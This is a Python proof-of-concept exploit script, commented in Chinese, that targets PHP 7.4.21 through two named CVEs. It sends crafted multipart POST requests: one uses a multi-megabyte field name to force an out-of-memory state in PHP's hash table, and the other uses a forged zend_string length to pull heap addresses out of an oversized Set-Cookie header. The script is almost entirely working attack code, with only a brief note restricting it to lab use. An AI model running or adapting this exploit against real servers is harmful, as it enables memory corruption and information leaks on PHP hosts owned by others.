#!/usr/bin/env python3
"""
php7421_poc.py — PHP 7.4.21 lab PoC / probe for CVE-2026-109618 (OOM state corruption)
和 CVE-2026-109619 (session stale-state) 的触发面验证。

模式:
  ht      —— 构造 <空名>&a=1&<超长名字>[x]=1，让 key 分配在
             _zend_hash_str_add_or_update_i() 中失败（7.4 同样先加计数后分配 key），
             留下未初始化 bucket，由请求 shutdown 的 $_POST 析构消费。
  session —— 8.x 的 session 悬空 PS(id) + Set-Cookie 越界读链（8.4/8.5 可用；
             7.4 的 php_session_reset_id 会无条件清零 send_cookie，故在 7.4 上仅作探针）。

仅用于自有 lab / 授权环境。
"""
import argparse, re, socket, struct, sys, urllib.parse

SID = b"attacksessionid0001"


def multipart(parts, boundary):
    out = bytearray()
    for name, data, filename in parts:
        out += b"--" + boundary + b"\r\n"
        if filename is not None:
            out += (b'Content-Disposition: form-data; name="' + name +
                    b'"; filename="' + filename + b'"\r\n'
                    b'Content-Type: application/octet-stream\r\n\r\n')
        else:
            out += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        out += data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def post(host, port, path, body, boundary, chunked=False, timeout=180.0):
    s = socket.create_connection((host, port), timeout=timeout)
    if chunked:
        hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n").encode()
    else:
        hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(hdr)
    try:
        if chunked:
            for i in range(0, len(body), 262144):
                part = body[i:i + 262144]
                s.sendall(b"%x\r\n" % len(part) + part + b"\r\n")
            s.sendall(b"0\r\n\r\n")
        else:
            s.sendall(body)
    except OSError:
        pass
    data = bytearray()
    s.settimeout(timeout)
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError:
        pass
    finally:
        s.close()
    return bytes(data)


def mode_ht(a):
    name = b"X" * (a.name_mb * 1024 * 1024) + b"[x]"
    parts = [
        (b"", b"A" * 276, None),
        (b"a", b"1", None),
        (name, b"1", None),
    ]
    body = multipart(parts, b"----H")
    print(f"[*] ht mode: name={len(name)} bytes, body={len(body)} bytes")
    r = post(a.host, a.port, a.path, body, b"----H", a.chunked)
    head, _, rest = r.partition(b"\r\n\r\n")
    print("[*] status:", head.split(b"\r\n")[0].decode(errors="replace"))
    low = r.lower()
    print("[*] fatal:", b"allowed memory size" in low, "| oom-hint:", b"exhausted" in low)
    print("[*] body:", rest[:200].decode(errors="replace").replace("\n", " "))


def mode_session(a):
    bdA, bdB = b"S" * 17, b"B" * 10
    parts = [(f"p{i:04d}".encode(), b"x", None) for i in range(1001)]
    parts += [(b"PHPSESSID", b"\x00", None),
              (b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None),
              (b"f", b"A" * 64, b"a.txt"),
              (b"big", b"B" * (a.huge_mb * 1024 * 1024), None)]
    body = multipart(parts, bdA)
    print(f"[*] session A: body={len(body)} bytes chunked={a.chunked}")
    ra = post(a.host, a.port, a.path, body, bdA, a.chunked)
    print("[*] A fatal:", b"allowed memory size" in ra.lower(), "resp=%d" % len(ra))

    parts = [(b"PHPSESSID", SID, None), (b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None)]
    for i in range(841):
        parts.append((str(1000 + i).encode(), (f"v{i:04d}" + "x" * 44)[:48].encode(), None))
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)  # forged zend_string len
    forge[0x18] = ord("L")
    parts.append((b"1999", bytes(forge), None))
    rb = post(a.host, a.port, a.path, multipart(parts, bdB), bdB, False)
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", rb)
    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""
    print("[*] B cookie decoded:", len(raw), "bytes")
    if len(raw) > 1000:
        from collections import Counter
        c = Counter()
        for i in range(len(raw) - 8):
            v = int.from_bytes(raw[i:i + 8], "little")
            if 0x500000000000 <= v <= 0x7fffffffffff:
                c[v & ~0x1fffff] += 1
        if c:
            print("[+] chunk base:", hex(c.most_common(1)[0][0]))
    else:
        print("[-] no OOB leak (7.4 的 reset_id 会清零 send_cookie)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8092)
    ap.add_argument("--path", default="/probe.php")
    ap.add_argument("--mode", choices=("ht", "session"), default="ht")
    ap.add_argument("--name-mb", type=int, default=6, help="ht 模式字段名长度(MB)")
    ap.add_argument("--huge-mb", type=int, default=12, help="session 模式 A 的大字段(MB)")
    ap.add_argument("--chunked", action="store_true")
    a = ap.parse_args()
    (mode_ht if a.mode == "ht" else mode_session)(a)


if __name__ == "__main__":
    main()
